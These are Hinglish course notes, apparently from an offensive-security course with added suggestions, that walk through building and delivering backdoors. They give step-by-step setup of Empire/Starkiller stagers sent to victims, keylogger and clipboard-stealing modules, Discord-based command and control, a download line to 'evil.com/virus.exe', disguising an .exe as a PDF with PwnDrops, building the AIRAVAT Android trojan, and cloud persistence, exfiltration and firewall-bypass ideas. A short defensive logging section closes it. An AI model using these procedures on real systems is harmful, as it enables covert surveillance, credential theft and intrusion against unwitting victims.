==================================================================================


### **Page 26: Empire & Starkiller**

*Original Image: Sticker 26*

**Topic: Section 11 - Hacking windows, linux, and macOS using tools..**

  * **Empire:** Ye ek powerful C2 framework hai.
      * Features: Windows, Linux, Apple sabko control kar sakta hai.
      * Communication AES encrypted hoti hai (security tools pakad nahi paate).
      * Isme bahut saare modules pehle se aate hain.
      * *Repo:* Github par `BC-Security/Empire` use karo (ye updated version hai).
  * **Starkiller:**
      * Empire sirf command line tool hai (text based).
      * **Starkiller** Empire ka **GUI (Frontend)** hai. Ye Empire ko chalana aasaan banata hai.
  * **Important Note:** Empire aur Starkiller use karne ke liye tumhe firewall mein inke ports allow karne honge.

-----

### **Page 27: Interacting with Starkiller**

*Original Image: Sticker 27*

**Topic: Login & Setup**

  * **Accessing Starkiller:**
      * Install karne ke baad browser mein jao.
      * URL: `http://tumhari_cloud_ip:1337` (Starkiller default port 1337 hota hai).
  * **Default Credentials:**
      * Username: `empireadmin`
      * Password: `password123`
  * **Why Cloud?**
      * Humne localhost ki jagah Cloud IP isliye di kyunki Empire cloud par install hai. Saari processing cloud par ho rahi hai.
  * **Initial Setup:**
      * Login karte hi default username aur password change kar lena chahiye.
      * **Users Menu:** Yahan se tum nayi teams bana sakte ho.
      * *Feature:* Ye "Multiplayer" game jaisa hai. Ek hi hacked computer ko tumhari poori hacking team alag-alag computers se control kar sakti hai.

-----

### **Page 28: Creating a Listener**

*Original Image: Sticker 28*

**Topic: Setting up the Receiver**

  * **Concept:** Backdoor create karne se pehle, humein ek "Listener" banana padega jo victim ke connection ka wait karega.
  * **Steps:**
    1.  Starkiller menu mein **'Listeners'** par click karo -\> **'Create'**.
    2.  **Type:** `HTTP` select karo (Ye sabse stable hota hai aur firewall se easily nikal jata hai).
    3.  **Name:** Kuch bhi naam do.
    4.  **Host/IP:** Apne Cloud Server ki IP daalo.
    5.  **Port:** Wo port daalo jo firewall mein open kiya hai (e.g., 80 ya 8080).
  * **Advanced Settings:**
      * **Kill Date:** Wo date set karo jab virus apne aap kaam karna band kar de.
      * **Working Hours:** Tum set kar sakte ho ki agent sirf 9:00 AM se 5:00 PM tak hi active rahe (taaki shaq na ho).
      * **Submit** par click karo. Listener start ho jayega.

-----

### **Page 29: Creating a Backdoor (Stager)**

*Original Image: Sticker 29*

**Topic: Generating the Virus File**

  * **Stager:** Empire ki language mein virus/payload ko "Stager" kehte hain.
  * **Steps:**
    1.  Menu mein **'Stagers'** par click karo -\> **'Create'**.
    2.  **Type:** `windows_launcher_bat` select karo (agar Windows hack karna hai).
    3.  **Listener:** Wo listener select karo jo abhi pichle step mein banaya tha.
    4.  **Language:** PowerShell select karo (Windows hacking ke liye best).
    5.  **Submit** aur phir **Download** icon par click karo.
  * **Execution:**
      * Ab ye `.bat` file victim ko bhejo.
      * Jaise hi wo isse run karega, tumhare Cloud Kali par connection aa jayega.

-----

==================================================================================


### **Page 30: Post Exploitation Basics**

*Original Image: Sticker 30*

**Topic: Section 12 - **Post Exploitation With StartKiller**

  * **Agents Tab:**
      * Jab victim file run karega, wo **'Agents'** tab mein dikhai dega.
      * Wahan uska computer name, IP, username sab dikhega.
      * Agent par double click karke tum usse control kar sakte ho.
  * **What can you do?**
      * File system access (files download/upload).
      * Camera aur Microphone access.
      * **Interact Tab:** Yahan tum direct commands type kar sakte ho.
      * Command: `help` type karo, saari available commands ki list aa jayegi.

-----

### **Page 31: Starkiller Modules**

*Original Image: Sticker 31*

**Topic: Using Empire Modules**

  * **The Power of Empire:** Empire ka asli maza uski **Module Library** mein hai.
  * **Usage:**
    1.  Agent select karo.
    2.  **'Execute Module'** par click karo.
    3.  **Search:** Search box mein jo attack karna hai wo type karo.
  * **Examples of Modules:**
      * **Reboot/Logoff:** Search `restart` or `logoff`.
      * **Troll:** Search `trollsploit`. Tum victim ka wallpaper change kar sakte ho, ghost sounds baja sakte ho, ya message box pop-up kar sakte ho.
      * **Spying:** Search `screenshot`.
          * Module: `powershell_collection_screenshot`.
          * *Reason:* Humne PowerShell stager use kiya tha, isliye PowerShell modules hi best kaam karenge.
      * Select karo aur **Execute** kar do. Output tumhe wahin dikh jayega.

-----



### **Page 32: Finding Sensitive Data & Module Filtering**
*Original Image: Sticker 32*

**Topic: Starkiller Module Info**

* **Module Information:**
    * Jab tum kisi module par click karte ho, tumhe uski details milti hain.
    * **Background:** `True/False` (Kya ye background mein chalega?).
    * **NeedAdmin:** `True/False` (Kya isse run karne ke liye Admin rights chahiye?).
    * **Github Link:** Wahan module ka source code dekhne ka link bhi hota hai.
* **Running a Module:**
    * Bas **'Run'** par click karo.
    * Output dekhne ke liye **'Tasks'** tab par jao.
* **Filtering Modules:**
    * Starkiller mein hazaron modules hain. Unhein dhundne ke liye left side mein filters use karo.
    * Tum Language (PowerShell, Python) ya Category (Credentials, Situational Awareness) ke hisaab se filter kar sakte ho.
* **Multi-Agent Execution:**
    * Tum ek hi module ko ek saath multiple hacked computers (Agents) par bhi run kar sakte ho.

---

### **Page 33: Stealing Windows Passwords**
*Original Image: Sticker 33*

**Topic: Collection Modules (Keylogger & Clipboard)**

* **Goal:** Username aur Password churana.
* **Tools:** Empire ka **'Collection'** module use karenge.
* **Module 1: Keylogger**
    * Module Name: `powershell/collection/keylogger`
    * **Function:** Ye victim ke keyboard par type kiye gaye har button (keystroke) ko record karta hai.
* **Module 2: Clipboard Monitor**
    * Module Name: `clipboard_monitor`
    * **Logic:** Bahut baar users password type karne ki jagah password manager ya text file se **Copy-Paste** karte hain.
    * Ye module clipboard par copy ki gayi har cheez ko steal kar leta hai.
* **Tip:** Agar sure nahi ho ki module kya karta hai, to uski description padh lo.

---

==================================================================================


### **Page 34: Discord as C2 (Introduction)**
*Original Image: Sticker 34*

**Topic: Section 13 - Hacking using Discord as c2**

* **Concept:** Hum **Distopia** naam ka tool use karenge.
* **Why Discord? (Staying under the RADAR):**
    * **No Port Forwarding:** Humein router mein ports open karne ki zarurat nahi hai.
    * **Trusted Traffic:** Network traffic `discord.com` par jayega. Firewall isse block nahi karega kyunki Discord ek trusted app hai.
    * **Encryption:** Discord ka communication HTTPS (Encrypted) hota hai.
* **How it works:**
    * Humara Virus (Backdoor) Discord ko message bhejega.
    * Humara Bot wo message padhega aur humein dega.
    * Hum command bhejenge -> Discord -> Virus -> Victim PC.
    * Hacker ko apna khud ka server setup karne ki zarurat hi nahi hai.

---

### **Page 35: Distopia Setup**
*Original Image: Sticker 35*

**Topic: Installing Distopia**

* **Advantage:** Apna server configure aur secure karne ka headache khatam. Connection zyada stealthy (chupke se) hota hai.
* **Installation:**
    * Github par jao aur search karo: `Distopia-C2` (ya course mein diye gaye link se).
    * Isse apne Kali Linux mein download aur install kar lo.

---

### **Page 36: Creating Discord Server**
*Original Image: Sticker 36*

**Topic: Setting up the Infrastructure**

* **Process:**
    1.  Discord install karo (Kali mein ya Web Browser mein).
    2.  Ek **New Server** create karo.
* **Logic:** Ye server humara "Command Center" banega jahan se hum agents se baat karenge.
* **Architecture:**
    * Hacker -> Discord -> Target
    * Hacker command Discord par type karega, Discord usse Target tak forward karega.
    * Target result wapas Discord par message ki tarah bhejega.

---

### **Page 37: Server Configuration**
*Original Image: Sticker 37*

**Topic: Creating Channels**

* **Template:** Distopia ke Github wiki par tumhe ek Template link milega. Usse use karke server banao, toh channels apne aap ban jayenge.
* **Manual Setup (Channels):**
    * Server ka naam kuch bhi rakho (e.g., `Distopia`).
    * Humein 2 main channels chahiye:
        1.  **#main:** Yahan hum commands bhejenge aur output dekhenge (Control Room).
        2.  **#keylogger:** Yahan victim ke keylogs (typed passwords/messages) aayenge.

---

### **Page 38: Weaponising Discord (Creating a Bot)**
*Original Image: Sticker 38*

**Topic: Discord Developer Portal**

* **Concept:** Hum khud messages type nahi karenge, hum ek **Bot** banayenge jo humare liye ye kaam karega.
* **Steps:**
    1.  Browser mein `discord.com/developers/applications` par jao.
    2.  **'New Application'** par click karo.
    3.  Naam do: `Distopia Bot` (ya kuch bhi).
    4.  Left menu mein **'Bot'** tab par click karo.
    5.  **Privileged Gateway Intents:** Saare intents enable kar do (taaki bot messages padh sake).
    6.  **Reset Access Token:** Is par click karke **Token Copy** kar lo.
    * **Important:** Ye Token password jaisa hai, isse save kar lo. Iski zarurat humein backdoor banane mein padegi.

---

### **Page 39: Adding Bot to Server**
*Original Image: Sticker 39*

**Topic: OAuth2 Generator**

* **Linking Bot:** Abhi Bot bana hai, lekin server mein add nahi hua.
* **Steps:**
    1.  Developer portal mein **'OAuth2'** -> **'URL Generator'** par jao.
    2.  **Scopes:** `bot` select karo.
    3.  **Permissions:** `Administrator` select karo (taaki sab access mile).
    4.  Neeche ek URL generate hoga, usse copy karo.
    5.  Browser mein wo URL paste karo.
    6.  Apna `Distopia` server select karo aur **'Authorize'** kar do.
* **Result:** Ab tumhare Discord server ke `#main` channel mein dikhega "Distopia Bot joined the server".

---

### **Page 40: Building the Backdoor**
*Original Image: Sticker 40*

**Topic: Generating the Payload**

* **Configuring the Tool:**
    * Kali Terminal mein Distopia folder mein jao.
    * Command run karo: `python3 builder.py`
    * Tool puchega "Use Discord?", `yes` type karo.
* **Getting IDs:**
    * Humein **Server ID (Guild ID)** chahiye.
    * Discord mein: Settings -> Advanced -> **Developer Mode** ON karo.
    * Ab apne Server name par Right Click karo -> **'Copy Server ID'**.
    * Is ID ko tool mein paste karo.
* **Token:** Tool tumse **Bot Token** maangega (jo Page 38 par copy kiya tha). Wo paste karo.

---

### **Page 41: Webhook for Keylogger**
*Original Image: Sticker 41*

**Topic: Keylogging Setup**

* **Channel ID:**
    * `#main` channel par right click karke **'Copy Channel ID'** karo aur tool mein de do.
* **Webhook Setup (For Keylogger):**
    * Keylogs ko fast bhejne ke liye Webhook use hota hai.
    * **Steps:**
        1.  Apne Server Settings mein jao -> **'Integrations'**.
        2.  **'Create Webhook'** par click karo.
        3.  Name: `Keylogger`.
        4.  Channel: `#keylogger` select karo.
        5.  **'Copy Webhook URL'** par click karo.
    * Is URL ko builder tool mein paste kar do.
* **Logic:** Ab jab bhi victim kuch type karega, backdoor us data ko seedha is Webhook URL par bhejega, aur wo data `#keylogger` channel mein print ho jayega.

---
Yeh raha tumhare notes ka agla hissa (Page 42 se Page 48) ka detailed breakdown Hinglish mein.

Is section mein hum **Discord C2** ke final steps, uske through **Post-Exploitation** (files churana, commands run karna), aur **Advanced Malware Delivery** (PwnDrops tool) ke baare mein samjhenge.



---

### **Page 42: Building & Connecting Backdoor**
*Original Image: Sticker 42*

**Topic: Finalizing the Setup**

* **Configuration Check:**
    * Builder tool mein `config` command run karo taaki tum dekh sako ki saari settings (Server ID, Token etc.) sahi set hain ya nahi.
* **Building the Payload:**
    * Command: `build`
    * Ye command tumhare liye backdoor (`.exe` file) create kar dega.
* **Execution:**
    * Is backdoor ko target computer par install/run karo.
* **Verification (Discord Side):**
    * Apne Discord server ke `#main` channel par jao.
    * Jaise hi victim file run karega, tumhe wahan uska IP address aur connection details dikhengi.
* **Basic Commands:**
    * `/help`: Saare bot commands dekhne ke liye jo tum use kar sakte ho.
    * `/ls`: Current online agents ki list dekhne ke liye.

---

==================================================================================


### **Page 44: Interacting with Agents**
*Original Image: Sticker 44*

**Topic: Section 14 - Windows Post Exploitation via Discord**
*(Note: Page 43 upload mein missing hai, lekin context yahan se continue ho raha hai)*

* **Concept:**
    * Humara aur backdoor ka interaction bilkul do doston ki tarah chatting jaisa lagega.
    * Hum Discord par message bhejenge, aur backdoor humein reply (output) message ki tarah bhejega.
* **Getting Info:**
    * System info, location wagera nikalne ke liye commands use hoti hain.
* **Targeting Specific Agent:**
    * Agar tumhare paas multiple victims hain, toh command kis par run karni hai ye batana padega.
    * **Step 1:** `/ls` se agent list dekho.
    * **Step 2:** `/interact <Agent_ID>` command use karo us specific agent ko select karne ke liye.
    * **Result:** Ab jo bhi command tum type karoge, wo sirf usi selected computer par execute hogi.

---

### **Page 45: Managing Sessions**
*Original Image: Sticker 45*

**Topic: Advanced Command Execution**

* **Backgrounding:**
    * Agar tum kisi agent ke saath interact kar rahe ho aur wapas main menu mein aana chahte ho.
    * Command: `/background` (Isse current session background mein chala jayega).
* **Mass Execution (Broadcasting):**
    * Agar tumhe koi command **saare** hacked computers par ek saath chalani hai.
    * Step 1: Sabhi agents se bahar aao (background karo).
    * Step 2: Command use karo: `/cmd-all <command>`
    * *Example:* `/cmd-all whoami`
    * **Result:** Saare connected agents ek saath response bhejenge.

---

==================================================================================


### **Page 46: File System Management**
*Original Image: Sticker 46*

**Topic: Section 15 - File Upload & Download**

* **How it works:**
    * Jab tum victim ke computer se kuch download karte ho, wo direct tumhare paas nahi aata. Wo file pehle Discord server par upload hoti hai, aur tumhe Discord ka **download link** milta hai.
    * Ye method stealthy hai kyunki traffic trusted source (Discord) se aa raha hai.
* **Uploading Files to Victim:**
    * Agar tumhe victim ke PC mein koi file daalni hai (upload karni hai):
    * **Requirement:** Tumhare paas us file ka ek **Direct Link (URL)** hona chahiye jahan wo hosted hai.
    * **Command:** `/upload <URL>`
    * *Example:* `/upload http://evil.com/virus.exe`
* **File Location:**
    * Upload ki gayi file victim ke computer mein yahan save hogi:
      `C:\Users\<username>\.config\uploads`

---

==================================================================================


### **Page 47: Keylogger & Self Hosting**
*Original Image: Sticker 47*

**Topic: Remote Keylogger & Advanced Delivery**

* **Keylogger Commands:**
    * Start karne ke liye: `/keylog module start interval 10`
        * *Matlab:* Har 10 second mein typed keys ka data Discord ke `#keylogger` channel par aayega.
    * Stop karne ke liye: `/keylog mode stop interval 0`

==================================================================================


* **Section 17: Advanced Malware Delivery**
* **Introduction to Self Hosting (PwnDrops):**
    * **Tool:** **PwnDrops**
    * Ye tool humein apna khud ka file hosting service banane deta hai.
    * **Features:**
        * Files ko click se enable/disable kar sakte ho.
        * **File Spoofing:** Ek hi file ke alag versions serve kar sakte ho (Normal file vs Trojan file).
        * Custom paths create kar sakte ho.
        * File extensions chhupa sakte ho.
* **Installation:**
    * Github se PwnDrops download aur install karo.
    * Tool run karne ke baad admin panel access karne ke liye browser mein URL dalo:
      `https://<tumhari_cloud_ip>/pwndrops`

---

### **Page 48: Advanced Phishing with PwnDrops**
*Original Image: Sticker 48*

**Topic: Hiding File Types & Extensions**

* **The Trick:** Hum user ko dikhayenge ki wo PDF download kar raha hai, lekin asal mein `.exe` file download hogi.
* **Steps:**
    1.  **PwnDrops** mein ek normal (safe) PDF file upload karo.
    2.  Wahin par apna Backdoor (virus file) bhi upload karo.
    3.  **Copy Link:** HTTP tab se Backdoor ka link copy kar lo.
    4.  **Configure PDF:** Ab us normal PDF file ki settings open karo.
    5.  **Redirect Path:** Wahan "Redirect path" ka option hoga. Usme Backdoor ka URL paste kar do.
* **Result:**
    * Jab victim ko lagega ki wo PDF download karne ke liye link par click kar raha hai (URL mein `.pdf` dikhega).
    * PwnDrops server us request ko redirect karke `.exe` file download karwa dega.
    * Ye ek advanced social engineering technique hai.

---

==================================================================================

How to use AIRAVAT (Advanced Internet Ransomware) with c2 for android its open source how to setup it and use it for ethical use and all ....

==================================================================================

Professional Phishing Infrastructure
Tumhare notes mein manual HTML page aur BeEF hai. Industry mein Mass Phishing Campaigns chalti hain.

GoPhish Setup on Cloud:

GoPhish tool ko AWS par setup karna.

Email Deliverability: AWS SES (Simple Email Service) ya SendGrid ko integrate karna taaki emails Spam folder mein na jayein.

SPF, DKIM, DMARC: Ye DNS records set karna taaki tumhari fake email asli company jaisi lage (Email Spoofing protection bypass).

==================================================================================

Pivoting & Tunneling (Cloud to Internal Network)
Tumhare notes mein tumne Cloud Server (Kali) se Victim PC connect kiya. Lekin industry mein scenario ulta hota hai. Tum Cloud se Corporate Internal Network mein ghuste ho.

Concept: Pivoting. Ek hacked machine ko "Bridge" banakar uske peeche chupe hue internal servers (Database, Internal HR portal) tak pahunchna.

Tools to add:

Chisel / Ligolo-ng: Modern tunneling tools jo firewall ko bypass karte hain.

SSH Dynamic Port Forwarding (SOCKS Proxy): SSH ke through traffic tunnel karna.

ProxyChains: Apne tools (Nmap, Metasploit) ko tunnel ke through chalana.

Why needed: Job interview mein puchenge, "Agar tumne web server hack kar liya, toh Database tak kaise pahunchoge?" Uska jawab Pivoting hai.

==================================================================================

Cloud Persistence (Backdoor that never dies)
Tumhare notes mein .exe file wala backdoor hai jo Antivirus pakad sakta hai. Cloud-native persistence alag hoti hai.

Malicious Lambda Functions: Ek aisa Lambda function banana jo har bar trigger ho jab koi user login kare, aur uska password chura le.

Backdooring AMIs: Ek malicious Amazon Machine Image (AMI) banana. Jab bhi company us image se naya server banayegi, tumhara access pehle se usme hoga.

Shadow Admin Accounts: Aise hidden users create karna jinke paas Admin rights ho lekin wo dashboard par easily na dikhein.

==================================================================================

Data Exfiltration via Cloud Services (Stealing Data Stealthily)
Agar tum 5GB data download karoge toh alarm baj jayega. Hackers Cloud services use karte hain data churane ke liye.

Exfiltration via Google Drive/OneDrive API: Victim ke PC se data seedha Google Drive par upload karna. Firewall isse block nahi karega kyunki Google Drive trusted hai.

Exfiltration via DNS Tunneling: Data ko DNS queries mein chupakar nikalna (Slow but very stealthy). Tool: dnscat2.

==================================================================================

Cloud WAF Bypassing (Web Application Firewall)
Cloudflare, AWS WAF, ya Akamai websites ko protect karte hain. Inhe bypass kiye bina attacks (SQLi, XSS) nahi chalenge.

IP Rotation: AWS API Gateway ka use karke har request alag IP se bhejna taaki WAF block na kar sake (Fireprox tool).

Origin IP Disclosure: Cloudflare ko bypass karke seedha backend server ki IP dhundna (Censys/Shodan use karke).

==================================================================================

Specific Request: AIRAVAT (Android RAT) Setup for Ethical Use
Tumne AIRAVAT ke baare mein poocha. Ye ek Android Remote Access Trojan (RAT) hai. Iska setup Distopia jaisa hi client-server model par chalta hai lekin ye Android phones ke liye hai.

Setup Overview (For Lab/Ethical Testing Only):

Requirement:

Ek VPS (Virtual Private Server) ya tumhara AWS Kali instance.

Java Development Kit (JDK) aur Node.js installed hona chahiye.

Server Setup (The Panel):

Airavat ka source code Github se clone karo.

Server folder mein jakar dependencies install karo (npm install).

Server start karo (node index.js). Ye tumhe ek Web Panel dega (usually port 80 ya 8080 par).

Note: Is panel par tum saare hacked phones dekh paoge.

Client Setup (The Virus - APK):

Airavat builder use karke APK generate karo.

Builder mein apni AWS IP Address daalni hogi taaki APK tumhare server se connect kare.

APK build hone ke baad, ise target Android phone (Emulator ya Test Device) mein install karo.

Permissions:

Install hone par ye permissions maangega (Accessibility, Overlay, etc.). Ethical hacking mein humein dekhna hota hai ki kaise Social Engineering se user ye permissions allow karta hai.

Ethical Use Case:

Iska use Corporate MDM (Mobile Device Management) solutions ko test karne ke liye kiya jata hai. Kya company ka antivirus is APK ko detect kar pa raha hai?

==================================================================================

1. Network Architecture & Pivoting (VPC Hacking)
Abhi tum seedha Victim PC ko connect kar rahe ho. Real world mein companies VPC (Virtual Private Cloud) use karti hain.

Concept:

Public Subnet vs Private Subnet.

Scenario: Tumne Web Server hack kiya (Public Subnet mein), ab wahan se Database (Private Subnet) tak kaise jaoge jo internet se connected hi nahi hai?

Missing Tool/Topic:

SSH Tunneling / Port Forwarding: ssh -D ya ssh -L commands.

Chisel: Firewall bypass karne ke liye.

Ligolo-ng: Modern pivoting tool jo poora network interface bana deta hai.

AWS VPC Peering: Ek hacked AWS account se dusre AWS account mein ghusna.

==================================================================================

Managed Phishing Framework on Cloud (GoPhish Example)

High-level points:

GoPhish jaise tool ko cloud VM par deploy karna (commands detail mein mat likho).

Concepts:

Landing pages (login clones).

Email templates.

Campaigns + Result dashboards (open, click, submitted credentials).

Ethical Use Case:

Sirf organization ki permission ke saath – “Phishing Awareness Training”.

==================================================================================

Section 25 – Cloud Logging, Detection & Reporting (Blue Team Add-On)

Itni saari offensive cheezein cover kar rahe ho, ek chhota defense module zaroor add karo – yeh interviews mein bohot strong point banega.

Topic 17: CloudTrail, GuardDuty & SIEM Integration

CloudTrail:

Kaun sa user kis service ko kab call kar raha hai.

Example suspicious patterns:

Multiple failed AssumeRole.

Unusual regions mein EC2 launch.

GuardDuty (or equivalent):

Anomalous API calls.

Credential compromise detections.

SIEM:

Logs ko central place pe bhejna, alerts banana.

Topic 18: Building a Simple Detection Playbook

Example playbooks:

“If: New access key created for IAM user → Then: Email + ticket”

“If: SecurityGroup open to world on high-risk port → Then: auto-remediation script”

==================================================================================
